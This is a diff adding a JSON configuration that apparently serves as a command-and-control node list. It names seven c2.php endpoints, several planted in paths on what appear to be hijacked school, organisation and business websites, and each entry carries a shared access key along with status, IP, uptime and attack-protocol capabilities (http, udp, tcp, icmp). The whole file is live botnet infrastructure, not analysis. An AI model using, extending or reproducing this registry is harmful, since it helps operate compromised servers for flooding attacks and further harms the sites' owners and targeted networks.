@@ -1,0 +1,112 @@
+[
+    {
+        "id": 2,
+        "name": "root",
+        "url": "https://teamanonymousindia.info/c2.php",
+        "api_key": "TAI-SEC",
+        "status": "online",
+        "ip": "192.168.1.11",
+        "uptime": 2553,
+        "is_checked": false,
+        "capabilities": {},
+        "network_speed": 0,
+        "cpu_usage": 0,
+        "latency": 81.25877380371094,
+        "signal_strength": 5
+    },
+    {
+        "id": 3,
+        "name": "bd",
+        "url": "https://pnsbbd.org/upload/MemberManage/c2.php",
+        "api_key": "TAI-SEC",
+        "status": "offline",
+        "ip": "unknown",
+        "uptime": 0,
+        "is_checked": false,
+        "capabilities": {},
+        "network_speed": 0,
+        "cpu_usage": 0,
+        "latency": 0,
+        "signal_strength": 0
+    },
+    {
+        "id": 4,
+        "name": "test",
+        "url": "https://schooltree.in/c2.php",
+        "api_key": "TAI-SEC",
+        "status": "online",
+        "ip": "",
+        "uptime": 0,
+        "is_checked": false,
+        "capabilities": {},
+        "network_speed": 0,
+        "cpu_usage": 0,
+        "latency": 16525.44927597046,
+        "signal_strength": 1
+    },
+    {
+        "id": 5,
+        "name": "net",
+        "url": "http://teamanonymousindia.in.net/c2.php",
+        "api_key": "TAI-SEC",
+        "status": "offline",
+        "ip": "unknown",
+        "uptime": 0,
+        "is_checked": false,
+        "capabilities": {},
+        "network_speed": 0,
+        "cpu_usage": 0,
+        "latency": 0,
+        "signal_strength": 0
+    },
+    {
+        "id": 6,
+        "name": "cd",
+        "url": "https://chankhola.com.bd/admin/images/orphan_image/c2.php",
+        "api_key": "TAI-SEC",
+        "status": "online",
+        "ip": "23.29.115.2",
+        "uptime": 3656952,
+        "is_checked": true,
+        "capabilities": {
+            "http": true,
+            "udp": true,
+            "tcp": true,
+            "icmp": true
+        },
+        "network_speed": 0,
+        "cpu_usage": 0,
+        "latency": 15760.221242904663,
+        "signal_strength": 1
+    },
+    {
+        "id": 7,
+        "name": "net pk",
+        "url": "https://www.inp.net.pk/public/c2.php",
+        "api_key": "TAI-SEC",
+        "status": "online",
+        "ip": "95.216.244.169",
+        "uptime": 75852268,
+        "is_checked": false,
+        "network_speed": 953,
+        "cpu_usage": 0.5,
+        "latency": 15710.079908370972,
+        "capabilities": {
+            "http": true,
+            "udp": true,
+            "tcp": true,
+            "icmp": true
+        },
+        "signal_strength": 1
+    },
+    {
+        "id": 8,
+        "name": "iprc.pk",
+        "url": "https://iprc.pk/c2.php",
+        "api_key": "TAI-SEC",
+        "status": "unknown",
+        "ip": "unknown",
+        "uptime": 0,
+        "is_checked": false
+    }
+]
